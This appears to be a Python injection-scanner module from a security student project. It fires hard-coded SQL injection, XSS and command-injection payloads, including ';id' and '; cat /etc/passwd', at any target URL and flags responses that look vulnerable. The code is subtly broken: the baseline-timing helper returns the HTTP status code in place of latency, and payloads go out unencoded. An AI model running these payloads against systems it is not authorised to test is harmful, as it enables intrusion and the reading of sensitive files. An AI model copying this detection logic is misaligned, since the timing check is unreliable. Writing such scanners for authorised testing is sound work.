"""Injection tester — SQL, command and XSS injection payloads."""

from __future__ import annotations

import logging
import time
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional

import requests

logger = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# Payload sets (CDC: 12 SQL, 12 CMD, 8 XSS).
# ---------------------------------------------------------------------------
SQL_PAYLOADS: List[str] = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "admin'--",
    "' UNION SELECT NULL--",
    "1; SELECT * FROM users--",
    "1' AND SLEEP(5)--",
    "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
    "' OR 1=1#",
    "1 OR 1=1",
    "'; WAITFOR DELAY '0:0:5'--",
    "1) OR 1=1--",
]

CMD_PAYLOADS: List[str] = [
    ";id",
    "|id",
    "&&id",
    "$(id)",
    "`id`",
    ";uname -a",
    "|whoami",
    "& whoami",
    "%0aid",
    "; cat /etc/passwd",
    "|cat /etc/passwd",
    "$(cat /etc/passwd)",
]

XSS_PAYLOADS: List[str] = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "\"><script>alert(1)</script>",
    "javascript:alert(1)",
    "<body onload=alert(1)>",
    "<iframe src=javascript:alert(1)>",
    "<details open ontoggle=alert(1)>",
]

# Signatures of database error messages.
SQL_ERROR_SIGNATURES: List[str] = [
    "sql syntax",
    "mysql_fetch",
    "ORA-",
    "SQLSTATE[",
    "PG::Error",
    "Microsoft SQL Server",
    "SQL Server",
    "sqlite3.OperationalError",
    "psycopg2",
    "PDOException",
    "You have an error in your SQL syntax",
]

CMD_SIGNATURES: List[str] = [
    "uid=",
    "gid=",
    "groups=",
    "root:",
    "daemon:",
    "Linux",
    "/bin/",
    "/usr/",
]


@dataclass
class InjectionResult:
    type: str
    target: str
    payload: str
    vulnerable: bool
    evidence: str = ""
    method: str = ""
    severity: str = "info"
    latency_ms: int = 0

    def to_dict(self) -> Dict[str, Any]:
        return {k: v for k, v in self.__dict__.items()}


class InjectionTester:
    """Test SQL / command / XSS injection against a target URL.

    The tester sends payloads as both GET query parameters and POST form
    fields (if a ``param`` is supplied) and inspects responses for error
    signatures, reflection and time-based delays.
    """

    def __init__(self, timeout: int = 10) -> None:
        self.timeout = timeout

    # ------------------------------------------------------------------
    def test(
        self,
        injection_type: str,
        target: str,
        profile: str = "balanced",
        param: Optional[str] = None,
    ) -> Dict[str, Any]:
        itype = (injection_type or "full").lower()
        if itype not in {"sql", "cmd", "xss", "full"}:
            raise ValueError(f"unknown injection type: {injection_type!r}")

        results: List[Dict[str, Any]] = []
        if itype in {"sql", "full"}:
            results.extend(self._run_payloads("sql", SQL_PAYLOADS, target, param))
        if itype in {"cmd", "full"}:
            results.extend(self._run_payloads("cmd", CMD_PAYLOADS, target, param))
        if itype in {"xss", "full"}:
            results.extend(self._run_payloads("xss", XSS_PAYLOADS, target, param))

        vulnerable = [r for r in results if r["vulnerable"]]
        return {
            "type": itype,
            "target": target,
            "param": param,
            "total_payloads": len(results),
            "vulnerable_payloads": len(vulnerable),
            "is_vulnerable": bool(vulnerable),
            "results": results,
            "summary": self._summarize(itype, results, vulnerable),
        }

    # ------------------------------------------------------------------
    def _run_payloads(
        self,
        itype: str,
        payloads: List[str],
        target: str,
        param: Optional[str],
    ) -> List[Dict[str, Any]]:
        out: List[Dict[str, Any]] = []
        # If no param provided, append payload to the path (reflected test).
        param_name = param or "q"
        for payload in payloads:
            result = self._send_payload(itype, payload, target, param_name)
            out.append(result.to_dict())
        return out

    def _send_payload(
        self,
        itype: str,
        payload: str,
        target: str,
        param_name: str,
    ) -> InjectionResult:
        # Baseline request for time-based detection.
        baseline_ms = self._measure(target, param_name, "baseline")
        # Send payload.
        latency_ms, status, body, headers = self._send(target, param_name, payload)
        vulnerable = False
        evidence = ""
        method = ""

        if itype == "sql":
            body_lower = (body or "").lower()
            for sig in SQL_ERROR_SIGNATURES:
                if sig.lower() in body_lower:
                    vulnerable = True
                    evidence = f"error signature '{sig}' in response"
                    method = "error-based"
                    break
            if not vulnerable and latency_ms > baseline_ms + 4000:
                vulnerable = True
                evidence = f"response delayed {latency_ms}ms (baseline {baseline_ms}ms)"
                method = "time-based"
        elif itype == "cmd":
            body_lower = (body or "").lower()
            for sig in CMD_SIGNATURES:
                if sig.lower() in body_lower and sig.lower() not in "baseline":
                    vulnerable = True
                    evidence = f"command output signature '{sig}' in response"
                    method = "reflection"
                    break
        elif itype == "xss":
            if payload in (body or ""):
                vulnerable = True
                evidence = "payload reflected unescaped in response body"
                method = "reflection"

        severity = "info"
        if vulnerable:
            severity = {
                "sql": "high",
                "cmd": "critical",
                "xss": "medium",
            }.get(itype, "info")

        return InjectionResult(
            type=itype,
            target=target,
            payload=payload,
            vulnerable=vulnerable,
            evidence=evidence,
            method=method,
            severity=severity,
            latency_ms=latency_ms,
        )

    # ------------------------------------------------------------------
    def _send(self, target: str, param: str, value: str) -> tuple[int, int, str, dict]:
        start = time.monotonic()
        try:
            if "?" in target:
                url = f"{target}&{param}={value}"
            else:
                url = f"{target}?{param}={value}"
            resp = requests.get(
                url,
                headers={"User-Agent": "PFE-CyberSec/1.0 (injection-test)"},
                timeout=self.timeout,
                verify=False,
                allow_redirects=False,
            )
            latency = int((time.monotonic() - start) * 1000)
            return latency, resp.status_code, resp.text, dict(resp.headers)
        except requests.RequestException as exc:
            latency = int((time.monotonic() - start) * 1000)
            return latency, -1, str(exc), {}

    def _measure(self, target: str, param: str, value: str) -> int:
        _, latency, _, _ = self._send(target, param, value)
        return latency

    # ------------------------------------------------------------------
    def _summarize(
        self,
        itype: str,
        results: List[Dict[str, Any]],
        vulnerable: List[Dict[str, Any]],
    ) -> str:
        if not vulnerable:
            return f"No {itype.upper()} injection vulnerabilities detected across {len(results)} payloads."
        methods = {v.get("method") for v in vulnerable if v.get("method")}
        return (
            f"{len(vulnerable)}/{len(results)} {itype.upper()} payloads triggered a vulnerability "
            f"(methods: {','.join(sorted(m for m in methods if m))})."
        )


__all__ = ["InjectionTester", "SQL_PAYLOADS", "CMD_PAYLOADS", "XSS_PAYLOADS"]
